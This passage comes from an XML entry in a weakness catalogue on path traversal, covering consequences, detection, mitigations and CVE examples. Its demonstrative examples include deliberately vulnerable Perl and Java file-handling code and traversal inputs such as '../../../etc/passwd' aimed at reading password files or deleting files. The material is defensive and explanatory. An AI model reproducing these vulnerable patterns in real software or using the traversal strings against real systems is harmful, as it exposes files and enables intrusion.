               <Relationship_Target_ID>877</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 09 - Input Output (FIO)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>981</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Path Traversal--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">928</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>932</Relationship_Target_ID>
               <!--OWASP Top Ten 2013 Category A4 - Insecure Direct Object References--></Relationship>
         </Relationships>
         <Relationship_Notes>
            <Relationship_Note>
               <Text>Pathname equivalence can be regarded as a type of canonicalization
						error.</Text>
            </Relationship_Note>
            <Relationship_Note>
               <Text>Some pathname equivalence issues are not directly related to directory
						traversal, rather are used to bypass security-relevant checks for whether a
						file/directory can be accessed by the attacker (e.g. a trailing "/" on a
						filename could bypass access rules that don't expect a trailing /, causing a
						server to provide the file when it normally would not).</Text>
            </Relationship_Note>
         </Relationship_Notes>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Directory traversal</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Path traversal</Term>
               <Alternate_Term_Description>
                  <Text>"Path traversal" is preferred over "directory traversal," but both
							terms are attack-focused.</Text>
               </Alternate_Term_Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Terminology_Notes>
            <Terminology_Note>
               <Text>Like other weaknesses, terminology is often based on the types of
						manipulations used, instead of the underlying weaknesses. Some people use
						"directory traversal" only to refer to the injection of ".." and equivalent
						sequences whose specific meaning is to traverse directories. </Text>
               <Text>Other variants like "absolute pathname" and "drive letter" have the
						*effect* of directory traversal, but some people may not call it such, since
						it doesn't involve ".." or equivalent.</Text>
            </Terminology_Note>
         </Terminology_Notes>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
            <Introductory_Phase>Implementation</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>High to Very High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>Execute unauthorized code or
						commands</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>The attacker may be able to create or overwrite critical files that
							are used to execute code, such as programs or libraries.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Technical_Impact>Modify files or
						directories</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>The attacker may be able to overwrite or create critical files, such
							as programs, libraries, or important data. If the targeted file is used
							for a security mechanism, then the attacker may be able to bypass that
							mechanism. For example, appending a new account at the end of a password
							file may allow an attacker to bypass authentication.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Technical_Impact>Read files or
						directories</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>The attacker may be able read the contents of unexpected files and
							expose sensitive data. If the targeted file is used for a security
							mechanism, then the attacker may be able to bypass that mechanism. For
							example, by reading a password file, the attacker could conduct brute
							force password guessing attacks in order to break into an account on the
							system.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>DoS: crash / exit /
						restart</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>The attacker may be able to overwrite, delete, or corrupt unexpected
							critical files such as programs, libraries, or important data. This may
							prevent the software from working at all and in the case of a protection
							mechanisms such as authentication, it has the potential to lockout every
							user of the software.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>Automated techniques can find areas where path traversal weaknesses
							exist. However, tuning or customization may be required to remove or
							de-prioritize path-traversal problems that are only exploitable by the
							software's administrator - or other privileged users - and thus
							potentially valid behavior or, at worst, a bug instead of a
							vulnerability.</Text>
               </Method_Description>
               <Method_Effectiveness>High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis</Method_Name>
               <Method_Description>
                  <Text>Manual white box techniques may be able to provide sufficient code
							coverage and reduction of false positives if all file access operations
							can be assessed within limited time constraints.</Text>
               </Method_Description>
               <Method_Effectiveness>High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Bytecode Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary / Bytecode disassembler - then use manual analysis for
									vulnerabilities &amp; anomalies</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with automated results
						interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Web Application Scanner</Text>
                        <Text>Web Services Scanner</Text>
                        <Text>Database Scanners</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Fuzz Tester</Text>
                        <Text>Framework-based Fuzzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5.1">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Input Validation</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Assume all input is malicious. Use an "accept known good" input
							validation strategy, i.e., use a whitelist of acceptable inputs that
							strictly conform to specifications. Reject any input that does not
							strictly conform to specifications, or transform it into something that
							does.</Text>
                  <Text>When performing input validation, consider all potentially relevant
							properties, including length, type of input, the full range of
							acceptable values, missing or extra inputs, syntax, consistency across
							related fields, and conformance to business rules. As an example of
							business rule logic, "boat" may be syntactically valid because it only
							contains alphanumeric characters, but it is not valid if the input is
							only expected to contain colors such as "red" or "blue."</Text>
                  <Text>Do not rely exclusively on looking for malicious or malformed inputs
							(i.e., do not rely on a blacklist). A blacklist is likely to miss at
							least one undesirable input, especially if the code's environment
							changes. This can give attackers enough room to bypass the intended
							validation. However, blacklists can be useful for detecting potential
							attacks or determining which inputs are so malformed that they should be
							rejected outright.</Text>
                  <Text>When validating filenames, use stringent whitelists that limit the
							character set to be used. If feasible, only allow a single "." character
							in the filename to avoid weaknesses such as CWE-23, and exclude
							directory separators such as "/" to avoid CWE-36. Use a whitelist of
							allowable file extensions, which will help to avoid CWE-434.</Text>
                  <Text>Do not rely exclusively on a filtering mechanism that removes
							potentially dangerous characters. This is equivalent to a blacklist,
							which may be incomplete (CWE-184). For example, filtering "/" is
							insufficient protection if the filesystem also supports the use of "\"
							as a directory separator. Another possible error could occur when the
							filtering is applied in a way that still produces dangerous data
							(CWE-182). For example, if "../" sequences are removed from the
							".../...//" string in a sequential fashion, two instances of "../" would
							be removed from the original string, but the remaining characters would
							still form the "../" string.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>For any security checks that are performed on the client side, ensure
							that these checks are duplicated on the server side, in order to avoid
							CWE-602. Attackers can bypass the client-side checks by modifying values
							after the checks have been performed, or by changing the client to
							remove the client-side checks entirely. Then, these modified values
							would be submitted to the server.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-20.1">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Input Validation</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Inputs should be decoded and canonicalized to the application's
							current internal representation before being validated (CWE-180). Make
							sure that the application does not decode the same input twice
							(CWE-174). Such errors could be used to bypass whitelist validation
							schemes by introducing dangerous inputs after they have been
							checked.</Text>
                  <Text>Use a built-in path canonicalization function (such as realpath() in
							C) that produces the canonical version of the pathname, which
							effectively removes ".." sequences and symbolic links (CWE-23, CWE-59).
							This includes:</Text>
                  <Block Block_Nature="List">
                     <Text>realpath() in C</Text>
                     <Text>getCanonicalPath() in Java</Text>
                     <Text>GetFullPath() in ASP.NET</Text>
                     <Text>realpath() or abs_path() in Perl</Text>
                     <Text>realpath() in PHP</Text>
                  </Block>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a vetted library or framework that does not allow this weakness to
							occur or provides constructs that make this weakness easier to
							avoid.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Firewall</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use an application firewall that can detect attacks against this
							weakness. It can be beneficial in cases in which the code cannot be
							fixed (because it is controlled by a third party), as an emergency
							prevention measure while more comprehensive software assurance measures
							are applied, or to provide defense in depth.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Moderate</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>An application firewall might not cover all possible input vectors. In
							addition, attack techniques might be available to bypass the protection
							mechanism, such as using malformed inputs that can still be processed by
							the component that receives those inputs. Depending on functionality, an
							application firewall might inadvertently reject or modify legitimate
							requests. Finally, some manual effort may be required for
							customization.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run your code using the lowest privileges that are required to
							accomplish the necessary tasks [R.22.5]. If possible, create isolated
							accounts with limited privileges that are only used for a single task.
							That way, a successful attack will not immediately give the attacker
							access to the rest of the software or its environment. For example,
							database applications rarely need to run as the database administrator,
							especially in day-to-day operations.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21.1">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Enforcement by Conversion</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>When the set of acceptable objects, such as filenames or URLs, is
							limited or known, create a mapping from a set of fixed input values
							(such as numeric IDs) to the actual filenames or URLs, and reject all
							other inputs.</Text>
                  <Text>For example, ID 1 could map to "inbox.txt" and ID 2 could map to
							"profile.txt". Features such as the ESAPI AccessReferenceMap [R.22.3]
							provide this capability.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Sandbox or Jail</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run the code in a "jail" or similar sandbox environment that enforces
							strict boundaries between the process and the operating system. This may
							effectively restrict which files can be accessed in a particular
							directory or which commands can be executed by the software.</Text>
                  <Text>OS-level examples include the Unix chroot jail, AppArmor, and SELinux.
							In general, managed code may provide some protection. For example,
							java.io.FilePermission in the Java SecurityManager allows the software
							to specify restrictions on file operations.</Text>
                  <Text>This may not be a feasible solution, and it only limits the impact to
							the operating system; the rest of the application may still be subject
							to compromise.</Text>
                  <Text>Be careful to avoid CWE-243 and other weaknesses related to jails.
						</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Limited</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>The effectiveness of this mitigation depends on the prevention
							capabilities of the specific sandbox or jail being used and might only
							help to reduce the scope of an attack, such as restricting the attacker
							to certain system calls or limiting the portion of the file system that
							can be accessed. </Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-34">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Identify and Reduce Attack Surface</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Store library, include, and utility files outside of the web document
							root, if possible. Otherwise, store them in a separate directory and use
							the web server's access control capabilities to prevent attackers from
							directly requesting them. One common practice is to define a fixed
							constant in each calling program, then check for the existence of the
							constant in the library/include file; if the constant does not exist,
							then the file was directly requested, and it can exit
							immediately.</Text>
                  <Text>This significantly reduces the chance of an attacker being able to
							bypass any protection mechanisms that are in the base program but not in
							the include files. It will also reduce the attack surface.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-39">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Ensure that error messages only contain minimal details that are
							useful to the intended audience, and nobody else. The messages need to
							strike the balance between being too cryptic and not being cryptic
							enough. They should not necessarily reveal the methods that were used to
							determine the error. Such detailed information can be used to refine the
							original attack to increase the chances of success.</Text>
                  <Text>If errors must be tracked in some detail, capture them in log messages
							- but consider what could occur if the log messages can be viewed by
							attackers. Avoid recording highly sensitive information such as
							passwords in any form. Avoid inconsistent messaging that might
							accidentally tip off an attacker about internal state, such as whether a
							username is valid or not.</Text>
                  <Text>In the context of path traversal, error messages which disclose path
							information can help attackers craft the appropriate attack strings to
							move through the file system hierarchy.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>When using PHP, configure the application so that it does not use
							register_globals. During implementation, develop the application so that
							it does not rely on this feature, but be wary of implementing a
							register_globals emulation that is subject to weaknesses such as CWE-95,
							CWE-621, and similar issues.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Causal_Nature>Explicit</Causal_Nature>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-27">
               <Intro_Text>The following code could be for a social networking application in
						which each user's profile information is stored in a separate file. All
						files are stored in a single directory.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Perl</Code_Example_Language>
                     <Code>my $dataPath = "/users/cwe/profiles";</Code>
                     <Code>my $username = param("user");</Code>
                     <Code>my $profilePath = $dataPath . "/" . $username;</Code>
                     <Code/>
                     <Code>open(my $fh, "&lt;$profilePath") || ExitError("profile read
								error: $profilePath");</Code>
                     <Code>print "&lt;ul&gt;\n";</Code>
                     <Code>while (&lt;$fh&gt;) {</Code>
                     <Block>
                        <Code>print "&lt;li&gt;$_&lt;/li&gt;\n";</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>print "&lt;/ul&gt;\n";</Code>
                  </Block>
                  <Text>While the programmer intends to access files such as
							"/users/cwe/profiles/alice" or "/users/cwe/profiles/bob", there is no
							verification of the incoming user parameter. An attacker could provide a
							string such as:</Text>
                  <Block Block_Nature="Attack">
                     <Code>../../../etc/passwd</Code>
                  </Block>
                  <Text>The program would generate a profile pathname like this:</Text>
                  <Block Block_Nature="Result">
                     <Code>/users/cwe/profiles/../../../etc/passwd</Code>
                  </Block>
                  <Text>When the file is opened, the operating system resolves the "../"
							during path canonicalization and actually accesses this file:</Text>
                  <Block Block_Nature="Result">
                     <Code>/etc/passwd</Code>
                  </Block>
                  <Text>As a result, the attacker could read the entire text of the password
							file.</Text>
                  <Text>Notice how this code also contains an error message information leak
							(CWE-209) if the user parameter does not produce a file that exists: the
							full pathname is provided. Because of the lack of output encoding of the
							file that is retrieved, there might also be a cross-site scripting
							problem (CWE-79) if profile contains any HTML, but other code would need
							to be examined. </Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-18">
               <Intro_Text>In the example below, the path to a dictionary file is read from a
						system property and used to initialize a File object.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>String filename =
								System.getProperty("com.domain.application.dictionaryFile");</Code>
                     <Code>File dictionaryFile = new File(filename);</Code>
                  </Block>
                  <Text>However, the path is not validated or modified to prevent it from
							containing relative or absolute path sequences before creating the File
							object. This allows anyone who can control the system property to
							determine what file is used. Ideally, the path should be resolved
							relative to some kind of application or user home directory.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-2">
               <Intro_Text>The following code takes untrusted input and uses a regular
						expression to filter "../" from the input. It then appends this result to
						the /home/user/ directory and attempts to read the file in the final
						resulting path.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Perl</Code_Example_Language>
                     <Code>my $Username = GetUntrustedInput();</Code>
                     <Code>$Username =~ s/\.\.\///;</Code>
                     <Code>my $filename = "/home/user/" . $Username;</Code>
                     <Code>ReadAndSendFile($filename);</Code>
                  </Block>
                  <Text>Since the regular expression does not have the /g global match
							modifier, it only removes the first instance of "../" it comes across.
							So an input value such as:</Text>
                  <Block Block_Nature="Attack">
                     <Code>../../../etc/passwd</Code>
                  </Block>
                  <Text>will have the first "../" stripped, resulting in:</Text>
                  <Block Block_Nature="Result">
                     <Code>../../etc/passwd</Code>
                  </Block>
                  <Text>This value is then concatenated with the /home/user/ directory:</Text>
                  <Block Block_Nature="Result">
                     <Code>/home/user/../../etc/passwd</Code>
                  </Block>
                  <Text>which causes the /etc/passwd file to be retrieved once the operating
							system has resolved the ../ sequences in the pathname. This leads to
							relative path traversal (CWE-23).</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code attempts to validate a given input path by
						checking it against a white list and once validated delete the given file.
						In this specific case, the path is considered valid if it starts with the
						string "/safe_dir/".</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>String path = getInputPath();</Code>
                     <Code>if (path.startsWith("/safe_dir/"))</Code>
                     <Code>{</Code>
                     <Block>
                        <Code>File f = new File(path);</Code>
                        <Code>f.delete()</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>An attacker could provide an input such as this:</Text>
                  <Block Block_Nature="Attack">
                     <Code>/safe_dir/../important.dat</Code>
                  </Block>
                  <Text>The software assumes that the path is valid because it starts with the
							"/safe_path/" sequence, but the "../" sequence will cause the program to
							delete the important.dat file in the parent directory</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-22">
               <Intro_Text>The following code demonstrates the unrestricted upload of a file
						with a Java servlet and a path traversal vulnerability. The HTML code is the
						same as in the previous example with the action attribute of the form
						sending the upload file request to the Java servlet instead of the PHP
						code.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>HTML</Code_Example_Language>
                     <Code>&lt;form action="FileUploadServlet" method="post"
								enctype="multipart/form-data"&gt;</Code>
                     <Code/>
                     <Code>Choose a file to upload: </Code>
                     <Code>&lt;input type="file" name="filename"/&gt;</Code>
                     <Code>&lt;br/&gt;</Code>
                     <Code>&lt;input type="submit" name="submit"
								value="Submit"/&gt;</Code>
                     <Code/>
                     <Code>&lt;/form&gt;</Code>
                  </Block>
                  <Text>When submitted the Java servlet's doPost method will receive the
							request, extract the name of the file from the Http request header, read
							the file contents from the request and output the file to the local
							upload directory.</Text>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>public class FileUploadServlet extends HttpServlet {</Code>
                     <Code/>
                     <Block>
                        <Code>...</Code>
                        <Code/>
                        <Code>protected void doPost(HttpServletRequest request,
									HttpServletResponse response) throws ServletException,
									IOException {</Code>
                        <Code/>
                        <Block>
                           <Code>response.setContentType("text/html");</Code>
                           <Code>PrintWriter out = response.getWriter();</Code>
                           <Code>String contentType = request.getContentType();</Code>
                           <Code/>
                           <Comment>// the starting position of the boundary
										header</Comment>
                           <Code>int ind = contentType.indexOf("boundary="); </Code>
                           <Code>String boundary = contentType.substring(ind+9);</Code>
                           <Code/>
                           <Code>String pLine = new String(); </Code>
                           <Code>String uploadLocation = new
										String(UPLOAD_DIRECTORY_STRING); //Constant value</Code>
                           <Code/>
                           <Comment>// verify that content type is multipart form data </Comment>
                           <Code>if (contentType != null &amp;&amp;
										contentType.indexOf("multipart/form-data") != -1) {</Code>
                           <Code/>
                           <Block>
                              <Code>// extract the filename from the Http header</Code>
                              <Code>BufferedReader br = new BufferedReader(new
											InputStreamReader(request.getInputStream()));</Code>
                              <Code>...</Code>
                              <Code>pLine = br.readLine(); </Code>
                              <Code>String filename =
											pLine.substring(pLine.lastIndexOf("\\"),
											pLine.lastIndexOf("\""));</Code>
                              <Code>...</Code>
                              <Code/>
                              <Comment>// output the file to the local upload
											directory</Comment>
                              <Code>try {</Code>
                              <Block>
                                 <Code>BufferedWriter bw = new BufferedWriter(new
												FileWriter(uploadLocation+filename, true));</Code>
                                 <Code>for (String line; (line=br.readLine())!=null; )
												{</Code>
                                 <Block>
                                    <Code>if (line.indexOf(boundary) == -1) {</Code>
                                    <Block>
                                       <Code>bw.write(line);</Code>
                                       <Code>bw.newLine();</Code>
                                       <Code>bw.flush();</Code>
                                    </Block>
                                    <Code>}</Code>
                                 </Block>
                                 <Code>} //end of for loop</Code>
                                 <Code>bw.close(); </Code>
                              </Block>
                              <Code/>
                              <Code>} catch (IOException ex) {...}</Code>
                              <Comment>// output successful upload response HTML
											page</Comment>
                           </Block>
                           <Code>}</Code>
                           <Comment>// output unsuccessful upload response HTML
										page</Comment>
                           <Code>else </Code>
                           <Code>{...}</Code>
                        </Block>
                        <Code>}</Code>
                        <Block>
                           <Code>...</Code>
                        </Block>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>This code does not check the filename that is provided in the header,
							so an attacker can use "../" sequences to write to files outside of the
							intended directory. Depending on the executing environment, the attacker
							may be able to specify arbitrary files to write to, leading to a wide
							variety of consequences, from code execution, XSS (CWE-79), or system
							crash.</Text>
                  <Text>Also, this code does not perform a check on the type of the file being
							uploaded. This could allow an attacker to upload any executable file or
							other file with malicious code (CWE-434).</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2010-0467</Observed_Example_Reference>
               <Observed_Example_Description>Newsletter module allows reading arbitrary files
						using "../" sequences.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-4194 </Observed_Example_Reference>
               <Observed_Example_Description>FTP server allows deletion of arbitrary files
						using ".." in the DELE command.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-4053 </Observed_Example_Reference>
               <Observed_Example_Description>FTP server allows creation of arbitrary
						directories using ".." in the MKD command.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-0244 </Observed_Example_Reference>
               <Observed_Example_Description>OBEX FTP service for a Bluetooth device allows
						listing of directories, and creation or reading of files using ".."
						sequences.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-4013</Observed_Example_Reference>
               <Observed_Example_Description>Software package maintenance program allows
						overwriting arbitrary files using "../"
						sequences.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-4449</Observed_Example_Reference>
               <Observed_Example_Description>Bulletin board allows attackers to determine the
						existence of files using the avatar.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-4581</Observed_Example_Reference>
               <Observed_Example_Description>PHP program allows arbitrary code execution using
						".." in filenames that are fed to the include()
						function.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2010-0012</Observed_Example_Reference>
               <Observed_Example_Description>Overwrite of files using a .. in a Torrent
						file.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2010-0013</Observed_Example_Reference>
               <Observed_Example_Description>Chat program allows overwriting files using a
						custom smiley request.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-5748</Observed_Example_Reference>
               <Observed_Example_Description>Chain: external control of values for user's
						desired language and theme enables path
						traversal.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-1936</Observed_Example_Reference>
               <Observed_Example_Description>Chain: library file sends a redirect if it is
						directly requested but continues to execute, allowing remote file inclusion
						and path traversal. </Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>File processing</Functional_Area>
         </Functional_Areas>
         <Relevant_Properties>
            <Relevant_Property>Equivalence</Relevant_Property>
         </Relevant_Properties>
         <Affected_Resources>
            <Affected_Resource>File/Directory</Affected_Resource>
         </Affected_Resources>
         <Research_Gaps>
            <Research_Gap>
               <Text>Many variants of path traversal attacks are probably under-studied with
						respect to root cause. CWE-790 and CWE-182 begin to cover part of this
						gap.</Text>
            </Research_Gap>
            <Research_Gap>
               <Text>Incomplete diagnosis or reporting of vulnerabilities can make it difficult
						to know which variant is affected. For example, a researcher might say that
						"..\" is vulnerable, but not test "../" which may also be vulnerable.</Text>
               <Text>Any combination of directory separators ("/", "\", etc.) and numbers of
						"." (e.g. "....") can produce unique variants; for example, the "//../"
						variant is not listed (CVE-2004-0325). See this entry's children and
						lower-level descendants.</Text>
            </Research_Gap>
         </Research_Gaps>
         <References>
            <Reference Reference_ID="REF-11" Local_Reference_ID="R.22.1">
               <Reference_Author>M. Howard</Reference_Author>
               <Reference_Author>D. LeBlanc</Reference_Author>
               <Reference_Title>Writing Secure Code</Reference_Title>
